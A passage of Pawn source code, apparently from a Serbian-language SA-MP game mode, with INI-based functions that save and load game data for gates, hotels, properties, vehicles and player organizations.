	INI_Float( "Pos5", GateData[ id ][ gatePos ][ 4 ] );
	INI_Float( "Pos6", GateData[ id ][ gatePos ][ 5 ] );
	INI_Int( "Interior", GateData[ id ][ gateInterior ] );
	INI_Int( "World", GateData[ id ][ gateWorld ] );
	INI_Float( "Move1", GateData[ id ][ gateMove ][ 0 ] );
	INI_Float( "Move2", GateData[ id ][ gateMove ][ 1 ] );
	INI_Float( "Move3", GateData[ id ][ gateMove ][ 2 ] );
	INI_Float( "Move4", GateData[ id ][ gateMove ][ 3 ] );
	INI_Float( "Move5", GateData[ id ][ gateMove ][ 4 ] );
	INI_Float( "Move6", GateData[ id ][ gateMove ][ 5 ] );

	return 1;
}
//------------------------------------------------------------------------------
stock SaveHotel( id ) {
	new iFile[ 40 ];
    format( iFile, sizeof( iFile ), HOTEL_FILE, id );
	new INI:File = INI_Open( iFile );
	INI_WriteInt( File, "Owned", hotelInfo[ id ][ hOwned ] );
	INI_WriteString( File, "Owner", hotelInfo[ id ][ hOwner ] );
	INI_WriteFloat( File, "Enter1", hotelInfo[ id ][ hEnter ][ 0 ] );
	INI_WriteFloat( File, "Enter2", hotelInfo[ id ][ hEnter ][ 1 ] );
	INI_WriteFloat( File, "Enter3", hotelInfo[ id ][ hEnter ][ 2 ] );
	INI_WriteFloat( File, "Exit1", hotelInfo[ id ][ hExit ][ 0 ] );
	INI_WriteFloat( File, "Exit2", hotelInfo[ id ][ hExit ][ 1 ] );
	INI_WriteFloat( File, "Exit3", hotelInfo[ id ][ hExit ][ 2 ] );
	INI_WriteInt( File, "Price", hotelInfo[ id ][ hPrice ] );
    INI_WriteInt( File, "RoomPrice", hotelInfo[ id ][ hRoomPrice ] );
    INI_WriteInt( File, "Money", hotelInfo[ id ][ hMoney ] );
    INI_WriteInt( File, "Interior", hotelInfo[ id ][ hInterior ] );
    INI_WriteInt( File, "VW", hotelInfo[ id ][ hVW ] );
	INI_WriteInt( File, "Level", hotelInfo[ id ][ hLevel ] );
	INI_WriteInt( File, "Locked", hotelInfo[ id ][ hLocked ] );
	INI_WriteString( File, "Adress", hotelInfo[ id ][ hAdress ] );
	INI_WriteString( File, "Guest_1", hotelInfo[ id ][ hGuest_1 ] );
	INI_WriteString( File, "Guest_2", hotelInfo[ id ][ hGuest_2 ] );
	INI_WriteString( File, "Guest_3", hotelInfo[ id ][ hGuest_3 ] );
	INI_WriteString( File, "Guest_4", hotelInfo[ id ][ hGuest_4 ] );
	INI_WriteString( File, "Guest_5", hotelInfo[ id ][ hGuest_5 ] );
	INI_WriteString( File, "Guest_6", hotelInfo[ id ][ hGuest_6 ] );
	INI_WriteString( File, "Guest_7", hotelInfo[ id ][ hGuest_7 ] );
	INI_WriteString( File, "Guest_8", hotelInfo[ id ][ hGuest_8 ] );
	INI_WriteString( File, "Guest_9", hotelInfo[ id ][ hGuest_9 ] );
	INI_WriteString( File, "Guest_10", hotelInfo[ id ][ hGuest_10 ] );
	INI_WriteInt( File, "Porez", hotelInfo[ id ][ hPorez ] );
	INI_WriteInt( File, "VrednostPoreza", hotelInfo[ id ][ hVrednostPoreza  ] );
	INI_Close( File );
	return 1;
}
forward LoadHotel( id, name[], value[] );
public LoadHotel( id, name[], value[] ) {

	INI_Int( "Owned", hotelInfo[ id ][ hOwned ] );
	INI_String( "Owner", hotelInfo[ id ][ hOwner ], MAX_PLAYER_NAME );
	INI_Float( "Enter1", hotelInfo[ id ][ hEnter ][ 0 ] );
	INI_Float( "Enter2", hotelInfo[ id ][ hEnter ][ 1 ] );
	INI_Float( "Enter3", hotelInfo[ id ][ hEnter ][ 2 ] );
	INI_Float( "Exit1", hotelInfo[ id ][ hExit ][ 0 ] );
	INI_Float( "Exit2", hotelInfo[ id ][ hExit ][ 1 ] );
	INI_Float( "Exit3", hotelInfo[ id ][ hExit ][ 2 ] );
	INI_Int( "Price", hotelInfo[ id ][ hPrice ] );
    INI_Int( "RoomPrice", hotelInfo[ id ][ hRoomPrice ] );
    INI_Int( "Money", hotelInfo[ id ][ hMoney ] );
    INI_Int( "Interior", hotelInfo[ id ][ hInterior ] );
    INI_Int( "VW", hotelInfo[ id ][ hVW ] );
	INI_Int( "Level", hotelInfo[ id ][ hLevel ] );
	INI_Int( "Locked", hotelInfo[ id ][ hLocked ] );
	INI_String( "Adress", hotelInfo[ id ][ hAdress ], 38 );
	INI_String( "Guest_1", hotelInfo[ id ][ hGuest_1 ], MAX_PLAYER_NAME );
	INI_String( "Guest_2", hotelInfo[ id ][ hGuest_2 ], MAX_PLAYER_NAME );
	INI_String( "Guest_3", hotelInfo[ id ][ hGuest_3 ], MAX_PLAYER_NAME );
	INI_String( "Guest_4", hotelInfo[ id ][ hGuest_4 ], MAX_PLAYER_NAME );
	INI_String( "Guest_5", hotelInfo[ id ][ hGuest_5 ], MAX_PLAYER_NAME );
	INI_String( "Guest_6", hotelInfo[ id ][ hGuest_6 ], MAX_PLAYER_NAME );
	INI_String( "Guest_7", hotelInfo[ id ][ hGuest_7 ], MAX_PLAYER_NAME );
	INI_String( "Guest_8", hotelInfo[ id ][ hGuest_8 ], MAX_PLAYER_NAME );
	INI_String( "Guest_9", hotelInfo[ id ][ hGuest_9 ], MAX_PLAYER_NAME );
	INI_String( "Guest_10", hotelInfo[ id ][ hGuest_10 ], MAX_PLAYER_NAME );
	INI_Int( "Porez", hotelInfo[ id ][ hPorez ] );
	INI_Int( "VrednostPoreza", hotelInfo[ id ][ hVrednostPoreza  ] );
	return 1;
}
//------------------------------------------------------------------------------
public SaveProperty( id ) {
	new iFile[ 40 ];
    format( iFile, sizeof( iFile ), IM_FILE, id );
	new INI:File = INI_Open( iFile );
	INI_WriteInt( File, "Owned", II[ id ][ iOwned ] );
	INI_WriteString( File, "Owner", II[ id ][ iOwner ] );
	INI_WriteInt( File, "Usage", II[ id ][iUsage] );
	INI_WriteFloat( File, "Enter1", II[ id ][ iEnter ][ 0 ] );
	INI_WriteFloat( File, "Enter2", II[ id ][ iEnter ][ 1 ] );
	INI_WriteFloat( File, "Enter3", II[ id ][ iEnter ][ 2 ] );
	INI_WriteFloat( File, "Exit1", II[ id ][ iExit ][ 0 ] );
	INI_WriteFloat( File, "Exit2", II[ id ][ iExit ][ 1 ] );
	INI_WriteFloat( File, "Exit3", II[ id ][ iExit ][ 2 ] );
	INI_WriteInt( File, "Price", II[ id ][ iPrice ] );
    INI_WriteInt( File, "Locked", II[ id ][ iLocked ] );
    INI_WriteInt( File, "Interior", II[ id ][ iInterior ] );
    INI_WriteInt( File, "VW", II[ id ][ iVW ] );
    INI_WriteInt( File, "Vrsta", II[ id ][ iVrsta ] );
    INI_WriteInt( File, "Ormar", II[ id ][ iOrmar ] );
	INI_WriteInt( File, "Skin1", II[ id ][ iSkin ][ 0 ] );
	INI_WriteInt( File, "Skin2", II[ id ][ iSkin ][ 1 ] );
	INI_WriteInt( File, "Skin3", II[ id ][ iSkin ][ 2 ] );
	INI_WriteInt( File, "SafeStatus", II[ id ][ iSafeStatus ] );
	INI_WriteInt( File, "SafePass", II[ id ][ iSafePass ] );
	INI_WriteInt( File, "Oruzje1", II[ id ][ iOruzje ][ 0 ] );
	INI_WriteInt( File, "Oruzje2", II[ id ][ iOruzje ][ 1 ] );
	INI_WriteInt( File, "Oruzje3", II[ id ][ iOruzje ][ 2 ] );
	INI_WriteInt( File, "Oruzje4", II[ id ][ iOruzje ][ 3 ] );
	INI_WriteInt( File, "Municija1", II[ id ][ iMunicija ][ 0 ] );
	INI_WriteInt( File, "Municija2", II[ id ][ iMunicija ][ 1 ] );
	INI_WriteInt( File, "Municija3", II[ id ][ iMunicija ][ 2 ] );
	INI_WriteInt( File, "Municija4", II[ id ][ iMunicija ][ 3 ] );
	INI_WriteInt( File, "Drug1", II[ id ][ iDrug ][ 0 ] );
	INI_WriteInt( File, "Drug2", II[ id ][ iDrug ][ 1 ] );
	INI_WriteInt( File, "Drug3", II[ id ][ iDrug ][ 2 ] );
	INI_WriteInt( File, "Drug4", II[ id ][ iDrug ][ 3 ] );
	INI_WriteInt( File, "Drug5", II[ id ][ iDrug ][ 4 ] );
	INI_WriteInt( File, "Drug6", II[ id ][ iDrug ][ 5 ] );
	INI_WriteInt( File, "Drug7", II[ id ][ iDrug ][ 6 ] );
	INI_WriteInt( File, "Drug8", II[ id ][ iDrug ][ 7 ] );
	INI_WriteInt( File, "Drug9", II[ id ][ iDrug ][ 8 ] );
	INI_WriteInt( File, "Drug10", II[ id ][ iDrug ][ 9 ] );
	INI_WriteInt( File, "DrugCode1", II[ id ][ iDrugCode ][ 0 ] );
	INI_WriteInt( File, "DrugCode2", II[ id ][ iDrugCode ][ 1 ] );
	INI_WriteInt( File, "DrugCode3", II[ id ][ iDrugCode ][ 2 ] );
	INI_WriteInt( File, "DrugCode4", II[ id ][ iDrugCode ][ 3 ] );
	INI_WriteInt( File, "DrugCode5", II[ id ][ iDrugCode ][ 4 ] );
	INI_WriteInt( File, "DrugCode6", II[ id ][ iDrugCode ][ 5 ] );
	INI_WriteInt( File, "DrugCode7", II[ id ][ iDrugCode ][ 6 ] );
	INI_WriteInt( File, "DrugCode8", II[ id ][ iDrugCode ][ 7 ] );
	INI_WriteInt( File, "DrugCode9", II[ id ][ iDrugCode ][ 8 ] );
	INI_WriteInt( File, "DrugCode10", II[ id ][ iDrugCode ][ 9 ] );
	INI_WriteInt( File, "DoorLevel", II[ id ][ iDoorLevel ] );
	INI_WriteInt( File, "Alarm", II[ id ][ iAlarm ] );
	INI_WriteInt( File, "LockLevel", II[ id ][ iLockLevel ] );
	INI_WriteInt( File, "Time", II[ id ][ iTime ] );
	INI_WriteFloat( File, "PizzaTime", II[ id ][ iPizzaTime ] );
	INI_WriteInt( File, "Level", II[ id ][ iLevel ] );
	INI_WriteString( File, "Adress", II[ id ][ iAdress ] );
	INI_WriteInt( File, "Neaktivnost", II[ id ][ iNeaktivnost ] );
	INI_WriteInt( File, "Rentable", II[ id ][ iRentable ] );
	INI_WriteInt( File, "RentPrice", II[ id ][ iRentPrice ] );
	INI_WriteInt( File, "Rentovano", II[ id ][ iRentovano ] );
	INI_WriteInt( File, "Money", II[ id ][ iMoney ] );
	INI_Close(File);
	return 1;
}
//------------------------------------------------------------------------------
public OcitajImovinu( id, name[], value[] ) {
    INI_Int( "Owned", II[ id ][ iOwned ] );
	INI_String( "Owner", II[ id ][ iOwner ], MAX_PLAYER_NAME );
	INI_Int( "Usage", II[ id ][iUsage] );
	INI_Float( "Enter1", II[ id ][ iEnter ][ 0 ] );
	INI_Float( "Enter2", II[ id ][ iEnter ][ 1 ] );
	INI_Float( "Enter3", II[ id ][ iEnter ][ 2 ] );
	INI_Float( "Exit1", II[ id ][ iExit ][ 0 ] );
	INI_Float( "Exit2", II[ id ][ iExit ][ 1 ] );
	INI_Float( "Exit3", II[ id ][ iExit ][ 2 ] );
	INI_Int( "Price", II[ id ][ iPrice ] );
    INI_Int( "Locked", II[ id ][ iLocked ] );
    INI_Int( "Interior", II[ id ][ iInterior ] );
    INI_Int( "VW", II[ id ][ iVW ] );
    INI_Int( "Vrsta", II[ id ][ iVrsta ] );
    INI_Int( "Ormar", II[ id ][ iOrmar ] );
	INI_Int( "Skin1", II[ id ][ iSkin ][ 0 ] );
	INI_Int( "Skin2", II[ id ][ iSkin ][ 1 ] );
	INI_Int( "Skin3", II[ id ][ iSkin ][ 2 ] );
	INI_Int( "SafeStatus", II[ id ][ iSafeStatus ] );
	INI_Int( "SafePass", II[ id ][ iSafePass ] );
	INI_Int( "Oruzje1", II[ id ][ iOruzje ][ 0 ] );
	INI_Int( "Oruzje2", II[ id ][ iOruzje ][ 1 ] );
	INI_Int( "Oruzje3", II[ id ][ iOruzje ][ 2 ] );
	INI_Int( "Oruzje4", II[ id ][ iOruzje ][ 3 ] );
	INI_Int( "Municija1", II[ id ][ iMunicija ][ 0 ] );
	INI_Int( "Municija2", II[ id ][ iMunicija ][ 1 ] );
	INI_Int( "Municija3", II[ id ][ iMunicija ][ 2 ] );
	INI_Int( "Municija4", II[ id ][ iMunicija ][ 3 ] );
	INI_Int( "Drug1", II[ id ][ iDrug ][ 0 ] );
	INI_Int( "Drug2", II[ id ][ iDrug ][ 1 ] );
	INI_Int( "Drug3", II[ id ][ iDrug ][ 2 ] );
	INI_Int( "Drug4", II[ id ][ iDrug ][ 3 ] );
	INI_Int( "Drug5", II[ id ][ iDrug ][ 4 ] );
	INI_Int( "Drug6", II[ id ][ iDrug ][ 5 ] );
	INI_Int( "Drug7", II[ id ][ iDrug ][ 6 ] );
	INI_Int( "Drug8", II[ id ][ iDrug ][ 7 ] );
	INI_Int( "Drug9", II[ id ][ iDrug ][ 8 ] );
	INI_Int( "Drug10", II[ id ][ iDrug ][ 9 ] );
	INI_Int( "DrugCode1", II[ id ][ iDrugCode ][ 0 ] );
	INI_Int( "DrugCode2", II[ id ][ iDrugCode ][ 1 ] );
	INI_Int( "DrugCode3", II[ id ][ iDrugCode ][ 2 ] );
	INI_Int( "DrugCode4", II[ id ][ iDrugCode ][ 3 ] );
	INI_Int( "DrugCode5", II[ id ][ iDrugCode ][ 4 ] );
	INI_Int( "DrugCode6", II[ id ][ iDrugCode ][ 5 ] );
	INI_Int( "DrugCode7", II[ id ][ iDrugCode ][ 6 ] );
	INI_Int( "DrugCode8", II[ id ][ iDrugCode ][ 7 ] );
	INI_Int( "DrugCode9", II[ id ][ iDrugCode ][ 8 ] );
	INI_Int( "DrugCode10", II[ id ][ iDrugCode ][ 9 ] );
	INI_Int( "DoorLevel", II[ id ][ iDoorLevel ] );
	INI_Int( "Alarm", II[ id ][ iAlarm ] );
	INI_Int( "LockLevel", II[ id ][ iLockLevel ] );
	INI_Int( "Time", II[ id ][ iTime ] );
	INI_Float( "PizzaTime", II[ id ][ iPizzaTime ] );
	INI_Int( "Level", II[ id ][ iLevel ] );
	INI_String( "Adress", II[ id ][ iAdress ], 38 );
	INI_Int( "Neaktivnost", II[ id ][ iNeaktivnost ] );
	INI_Int( "Rentable", II[ id ][ iRentable ] );
	INI_Int( "RentPrice", II[ id ][ iRentPrice ] );
	INI_Int( "Rentovano", II[ id ][ iRentovano ] );
	INI_Int( "Money", II[ id ][ iMoney ] );
    return true;
}
//------------------------------------------------------------------------------
public SaveVehicle( id ) {

	new file4[40];
	format(file4, sizeof(file4), V_FILE, id);
	new INI:File = INI_Open(file4);
	INI_SetTag( File, "Informacije");
	INI_WriteInt( File, "Kupljen", VehicleInfo[ id ][ vOwned ] );
	INI_WriteInt( File, "Cena", VehicleInfo[ id ][ vPrice ] );
	INI_WriteString( File, "Vlasnik", VehicleInfo[ id ][ vOwner ] );
	INI_WriteInt( File, "Zakljucana", VehicleInfo[ id ][ vLocked ] );
	INI_WriteFloat( File, "LokacijaX", VehicleInfo[ id ][ vLokacijaX ] );
	INI_WriteFloat( File, "LokacijaY", VehicleInfo[ id ][ vLokacijaY ] );
	INI_WriteFloat( File, "LokacijaZ", VehicleInfo[ id ][ vLokacijaZ ] );
	INI_WriteFloat( File, "LokacijaA", VehicleInfo[ id ][ vLokacijaA ] );
	INI_WriteInt( File, "VirtualWorld", VehicleInfo[ id ][ vVirtualWorld ] );
	INI_WriteInt( File, "Interior", VehicleInfo[ id ][ vInterior ] );
	INI_WriteInt( File, "Koriscenje", VehicleInfo[ id ][ vUsage ] );
	INI_WriteInt( File, "Posao", VehicleInfo[ id ][ vJob ] );
	INI_WriteInt( File, "Orga", VehicleInfo[ id ][ vOrganization ] );
	INI_WriteInt( File, "Boja1", VehicleInfo[ id ][ vColor1 ] );
	INI_WriteInt( File, "Boja2", VehicleInfo[ id ][ vColor2 ] );
	INI_WriteInt( File, "Model", VehicleInfo[ id ][ vModel ] );
	INI_WriteInt( File, "Reg", VehicleInfo[ id ][ vReg ] );
	INI_WriteInt( File, "Teh", VehicleInfo[ id ][ vTeh ] );
	INI_WriteInt( File, "GPS", VehicleInfo[ id ][ vGPS ] );
	INI_WriteInt( File, "Osiguranje", VehicleInfo[ id ][ vOsiguranje ] );
	INI_WriteInt( File, "Lock", VehicleInfo[ id ][ vLock ] );
	INI_WriteInt( File, "Alarm", VehicleInfo[ id ][ vAlarm ] );
	INI_WriteInt( File, "Fuel", VehicleInfo[ id ][ vFuel ] );
	INI_WriteInt( File, "Neon", VehicleInfo[ id ][ vNeon ] );
	INI_WriteInt( File, "Tuned", VehicleInfo[ id ][ vTuned ] );
	INI_WriteInt( File, "Imobilizator", VehicleInfo[ id ][ vImobilizator ] );
	INI_WriteInt( File, "Spoiler", VehicleInfo[ id ][ vSpoiler ] );
	INI_WriteInt( File, "Hood", VehicleInfo[ id ][ vHood ] );
	INI_WriteInt( File, "Roof", VehicleInfo[ id ][ vRoof ] );
	INI_WriteInt( File, "Skirt", VehicleInfo[ id ][ vSkirt ] );
	INI_WriteInt( File, "Lamps", VehicleInfo[ id ][ vLamps ] );
	INI_WriteInt( File, "Nitro", VehicleInfo[ id ][ vNitro ] );
	INI_WriteInt( File, "Exhaust", VehicleInfo[ id ][ vExhaust ] );
	INI_WriteInt( File, "Wheels", VehicleInfo[ id ][ vWheels ] );
	INI_WriteInt( File, "Stereo", VehicleInfo[ id ][ vStereo ] );
	INI_WriteInt( File, "Hydraulics", VehicleInfo[ id ][ vHydraulics ] );
	INI_WriteInt( File, "FrontBumper", VehicleInfo[ id ][ vFrontBumper ] );
	INI_WriteInt( File, "RearBumper", VehicleInfo[ id ][ vRearBumper ] );
	INI_WriteInt( File, "Vents", VehicleInfo[ id ][ vVents ] );
	INI_WriteInt( File, "PaintJob", VehicleInfo[ id ][ vPaintJob ] );
	INI_WriteInt( File, "Provera", VehicleInfo[ id ][ vProvera ] );
	INI_WriteInt( File, "ID", VehicleInfo[ id ][ vID ] );
	INI_WriteInt( File, "Drug1", VehicleInfo[ id ][ vDrug ][ 0 ] );
	INI_WriteInt( File, "Drug2", VehicleInfo[ id ][ vDrug ][ 1 ] );
	INI_WriteInt( File, "Drug3", VehicleInfo[ id ][ vDrug ][ 2 ] );
	INI_WriteInt( File, "Drug4", VehicleInfo[ id ][ vDrug ][ 3 ] );
	INI_WriteInt( File, "Drug5", VehicleInfo[ id ][ vDrug ][ 4 ] );
	INI_WriteInt( File, "Drug6", VehicleInfo[ id ][ vDrug ][ 5 ] );
	INI_WriteInt( File, "DrugCode1", VehicleInfo[ id ][ vDrugCode ][ 0 ] );
	INI_WriteInt( File, "DrugCode2", VehicleInfo[ id ][ vDrugCode ][ 1 ] );
	INI_WriteInt( File, "DrugCode3", VehicleInfo[ id ][ vDrugCode ][ 2 ] );
	INI_WriteInt( File, "DrugCode4", VehicleInfo[ id ][ vDrugCode ][ 3 ] );
	INI_WriteInt( File, "DrugCode5", VehicleInfo[ id ][ vDrugCode ][ 4 ] );
	INI_WriteInt( File, "DrugCode6", VehicleInfo[ id ][ vDrugCode ][ 5 ] );
	INI_WriteInt( File, "Melee", VehicleInfo[ id ][ vMelee ] );
	INI_WriteInt( File, "Weap1", VehicleInfo[ id ][ vWeap1 ] );
	INI_WriteInt( File, "Ammo1", VehicleInfo[ id ][ vAmmo1 ] );
	INI_WriteInt( File, "Weap2", VehicleInfo[ id ][ vWeap2 ] );
	INI_WriteInt( File, "Ammo2", VehicleInfo[ id ][ vAmmo2 ] );
	INI_WriteInt( File, "Gajbica1", VehicleInfo[ id ][ vGajbica ][ 0 ] );
	INI_WriteInt( File, "Gajbica2", VehicleInfo[ id ][ vGajbica ][ 1 ] );
	INI_WriteInt( File, "Gajbica3", VehicleInfo[ id ][ vGajbica ][ 2 ] );
	INI_WriteInt( File, "Gajbica4", VehicleInfo[ id ][ vGajbica ][ 3 ] );
	INI_WriteInt( File, "Gajbica5", VehicleInfo[ id ][ vGajbica ][ 4 ] );
	INI_WriteInt( File, "GajbicaKolicina1", VehicleInfo[ id ][ vGajbicaAmmount ][ 0 ] );
    INI_WriteInt( File, "GajbicaKolicina2", VehicleInfo[ id ][ vGajbicaAmmount ][ 1 ] );
    INI_WriteInt( File, "GajbicaKolicina3", VehicleInfo[ id ][ vGajbicaAmmount ][ 2 ] );
    INI_WriteInt( File, "GajbicaKolicina4", VehicleInfo[ id ][ vGajbicaAmmount ][ 3 ] );
    INI_WriteInt( File, "GajbicaKolicina5", VehicleInfo[ id ][ vGajbicaAmmount ][ 4 ] );
    INI_WriteInt( File, "Neaktivnost", VehicleInfo[ id ][ vNeaktivnost ] );
    INI_WriteInt( File, "Kilometri", VehicleInfo[ id ][ vKilometri ] );
	INI_WriteInt( File, "Metri", VehicleInfo[ id ][ vMetri ] );
    INI_WriteInt( File, "Cipovanje", VehicleInfo[id][vCipovanje]);
	INI_Close(File);
	return true;
}
//------------------------------------------------------------------------------
public OcitajVozilo( id, name[], value[] ) {
    INI_Int( "Kupljen", VehicleInfo[ id ][ vOwned ] );
	INI_Int( "Cena", VehicleInfo[ id ][ vPrice ] );
	INI_String( "Vlasnik", VehicleInfo[ id ][ vOwner ], MAX_PLAYER_NAME );
	INI_Int( "Zakljucana", VehicleInfo[ id ][ vLocked ] );
	INI_Float( "LokacijaX", VehicleInfo[ id ][ vLokacijaX ] );
	INI_Float( "LokacijaY", VehicleInfo[ id ][ vLokacijaY ] );
	INI_Float( "LokacijaZ", VehicleInfo[ id ][ vLokacijaZ ] );
	INI_Float( "LokacijaA", VehicleInfo[ id ][ vLokacijaA ] );
	INI_Int( "VirtualWorld", VehicleInfo[ id ][ vVirtualWorld ] );
	INI_Int( "Interior", VehicleInfo[ id ][ vInterior ] );
	INI_Int( "Koriscenje", VehicleInfo[ id ][ vUsage ] );
	INI_Int( "Posao", VehicleInfo[ id ][ vJob ] );
	INI_Int( "Orga", VehicleInfo[ id ][ vOrganization ] );
	INI_Int( "Boja1", VehicleInfo[ id ][ vColor1] );
	INI_Int( "Boja2", VehicleInfo[ id ][ vColor2] );
	INI_Int( "Model", VehicleInfo[ id ][ vModel] );
	INI_Int( "Reg", VehicleInfo[ id ][ vReg ] );
	INI_Int( "Teh", VehicleInfo[ id ][ vTeh ] );
	INI_Int( "GPS", VehicleInfo[ id ][ vGPS ] );
	INI_Int( "Osiguranje", VehicleInfo[ id ][ vOsiguranje ] );
	INI_Int( "Lock", VehicleInfo[ id ][ vLock ] );
	INI_Int( "Alarm", VehicleInfo[ id ][ vAlarm ] );
	INI_Int( "Fuel", VehicleInfo[ id ][ vFuel ] );
	INI_Int( "Neon", VehicleInfo[ id ][ vNeon ] );
	INI_Int( "Tuned", VehicleInfo[ id ][ vTuned ] );
	INI_Int( "Imobilizator", VehicleInfo[ id ][ vImobilizator ] );
	INI_Int( "Spoiler", VehicleInfo[ id ][ vSpoiler] );
	INI_Int( "Hood", VehicleInfo[ id ][ vHood] );
	INI_Int( "Roof", VehicleInfo[ id ][ vRoof] );
	INI_Int( "Skirt", VehicleInfo[ id ][ vSkirt] );
	INI_Int( "Lamps", VehicleInfo[ id ][ vLamps] );
	INI_Int( "Nitro", VehicleInfo[ id ][ vNitro] );
	INI_Int( "Exhaust", VehicleInfo[ id ][ vExhaust] );
	INI_Int( "Wheels", VehicleInfo[ id ][ vWheels] );
	INI_Int( "Stereo", VehicleInfo[ id ][ vStereo] );
	INI_Int( "Hydraulics", VehicleInfo[ id ][ vHydraulics] );
	INI_Int( "FrontBumper", VehicleInfo[ id ][ vFrontBumper] );
	INI_Int( "RearBumper", VehicleInfo[ id ][ vRearBumper] );
	INI_Int( "Vents", VehicleInfo[ id ][ vVents] );
	INI_Int( "PaintJob", VehicleInfo[ id ][ vPaintJob ] );
	INI_Int( "Provera", VehicleInfo[ id ][ vProvera ] );
	INI_Int( "Drug1", VehicleInfo[ id ][ vDrug ][ 0 ] );
	INI_Int( "Drug2", VehicleInfo[ id ][ vDrug ][ 1 ] );
	INI_Int( "Drug3", VehicleInfo[ id ][ vDrug ][ 2 ] );
	INI_Int( "Drug4", VehicleInfo[ id ][ vDrug ][ 3 ] );
	INI_Int( "Drug5", VehicleInfo[ id ][ vDrug ][ 4 ] );
	INI_Int( "Drug6", VehicleInfo[ id ][ vDrug ][ 5 ] );
	INI_Int( "DrugCode1", VehicleInfo[ id ][ vDrugCode ][ 0 ] );
	INI_Int( "DrugCode2", VehicleInfo[ id ][ vDrugCode ][ 1 ] );
	INI_Int( "DrugCode3", VehicleInfo[ id ][ vDrugCode ][ 2 ] );
	INI_Int( "DrugCode4", VehicleInfo[ id ][ vDrugCode ][ 3 ] );
	INI_Int( "DrugCode5", VehicleInfo[ id ][ vDrugCode ][ 4 ] );
	INI_Int( "DrugCode6", VehicleInfo[ id ][ vDrugCode ][ 5 ] );
	INI_Int( "Melee", VehicleInfo[ id ][ vMelee ] );
	INI_Int( "Weap1", VehicleInfo[ id ][ vWeap1 ] );
	INI_Int( "Ammo1", VehicleInfo[ id ][ vAmmo1 ] );
	INI_Int( "Weap2", VehicleInfo[ id ][ vWeap2 ] );
	INI_Int( "Ammo2", VehicleInfo[ id ][ vAmmo2 ] );
	INI_Int( "Gajbica1", VehicleInfo[ id ][ vGajbica ][ 0 ] );
	INI_Int( "Gajbica2", VehicleInfo[ id ][ vGajbica ][ 1 ] );
	INI_Int( "Gajbica3", VehicleInfo[ id ][ vGajbica ][ 2 ] );
	INI_Int( "Gajbica4", VehicleInfo[ id ][ vGajbica ][ 3 ] );
	INI_Int( "Gajbica5", VehicleInfo[ id ][ vGajbica ][ 4 ] );
	INI_Int( "GajbicaKolicina1", VehicleInfo[ id ][ vGajbicaAmmount ][ 0 ] );
    INI_Int( "GajbicaKolicina2", VehicleInfo[ id ][ vGajbicaAmmount ][ 1 ] );
    INI_Int( "GajbicaKolicina3", VehicleInfo[ id ][ vGajbicaAmmount ][ 2 ] );
    INI_Int( "GajbicaKolicina4", VehicleInfo[ id ][ vGajbicaAmmount ][ 3 ] );
    INI_Int( "GajbicaKolicina5", VehicleInfo[ id ][ vGajbicaAmmount ][ 4 ] );
    INI_Int( "Neaktivnost", VehicleInfo[ id ][ vNeaktivnost ] );
    INI_Int( "Kilometri", VehicleInfo[ id ][ vKilometri ] );
	INI_Int( "Metri", VehicleInfo[ id ][ vMetri ] );
	INI_Int( "ID", VehicleInfo[ id ][ vID ] );
    INI_Int("Cipovanje", VehicleInfo[id][vCipovanje]);
	return true;
}

//------------------------------------------------------------------------------
public PorukaRadius( Float:radi, playerid, string[ ], col1 )
{
	if( IsPlayerConnected( playerid ) )
	{
		foreach( Player, i ) {
            if( IsPlayerNearPlayer( 25.0, playerid, i ) ) {
                SCM( i, col1, string );
            }
        }
	}
	return 1;
}

//------------------------------------------------------------------------------
public SaveOrganization(id)
{
	new org_file[ 40 ];
	format (org_file, sizeof( org_file ), O_FILE, id );
	new INI:File = INI_Open( org_file );
	INI_SetTag( File, "Organizacija");

	INI_WriteInt( File, "ID", OI[ id ][ oID ] );
	INI_WriteString( File, "Ime", OI[ id ][ oName ] );
	INI_WriteString( File, "PreFix", OI[ id ][ oPreFix ] );
	INI_WriteString( File, "Color", OI[ id ][ oColor ] );

	INI_WriteInt( File, "Tip", OI[ id ][ oTip ] );
	INI_WriteInt( File, "MaxClanova", OI[ id ][ oMaxClanova ] );
	INI_WriteInt( File, "UbacenihClanova", OI[ id ][ oUbacenihClanova ] );

    INI_WriteInt( File, "Skin1", OI[ id ][ oSkin1 ] );
	INI_WriteInt( File, "Skin2", OI[ id ][ oSkin2 ] );
	INI_WriteInt( File, "Skin3", OI[ id ][ oSkin3 ] );
	INI_WriteInt( File, "Skin4", OI[ id ][ oSkin4 ] );
	INI_WriteInt( File, "Skin5", OI[ id ][ oSkin5 ] );
	INI_WriteInt( File, "Skin6", OI[ id ][ oSkin6 ] );
	
	INI_WriteInt( File, "ZSkin1", OI[ id ][ oZSkin1 ] );
	INI_WriteInt( File, "ZSkin2", OI[ id ][ oZSkin2 ] );
	INI_WriteInt( File, "ZSkin3", OI[ id ][ oZSkin3 ] );
	INI_WriteInt( File, "ZSkin4", OI[ id ][ oZSkin4 ] );
	INI_WriteInt( File, "ZSkin5", OI[ id ][ oZSkin5 ] );
	INI_WriteInt( File, "ZSkin6", OI[ id ][ oZSkin6 ] );

    INI_WriteString( File, "Lider1", OI[ id ][ oLider1 ] );
    INI_WriteString( File, "Lider2", OI[ id ][ oLider2 ] );

	INI_WriteString( File, "Clan1", OI[ id ][ oClan1 ] );
	INI_WriteString( File, "Clan2", OI[ id ][ oClan2 ] );
	INI_WriteString( File, "Clan3", OI[ id ][ oClan3 ] );
	INI_WriteString( File, "Clan4", OI[ id ][ oClan4 ] );
	INI_WriteString( File, "Clan5", OI[ id ][ oClan5 ] );
	INI_WriteString( File, "Clan6", OI[ id ][ oClan6 ] );
	INI_WriteString( File, "Clan7", OI[ id ][ oClan7 ] );
	INI_WriteString( File, "Clan8", OI[ id ][ oClan8 ] );
	INI_WriteString( File, "Clan9", OI[ id ][ oClan9 ] );
	INI_WriteString( File, "Clan10", OI[ id ][ oClan10 ] );
	INI_WriteString( File, "Clan11", OI[ id ][ oClan11 ] );
	INI_WriteString( File, "Clan12", OI[ id ][ oClan12 ] );
	INI_WriteString( File, "Clan13", OI[ id ][ oClan13 ] );
	INI_WriteString( File, "Clan14", OI[ id ][ oClan14 ] );
	INI_WriteString( File, "Clan15", OI[ id ][ oClan15 ] );
	INI_WriteString( File, "Clan16", OI[ id ][ oClan16 ] );
	INI_WriteString( File, "Clan17", OI[ id ][ oClan17 ] );
	INI_WriteString( File, "Clan18", OI[ id ][ oClan18 ] );
	INI_WriteString( File, "Clan19", OI[ id ][ oClan19 ] );
	INI_WriteString( File, "Clan20", OI[ id ][ oClan20 ] );
	INI_WriteString( File, "Clan21", OI[ id ][ oClan21 ] );
	INI_WriteString( File, "Clan22", OI[ id ][ oClan22 ] );
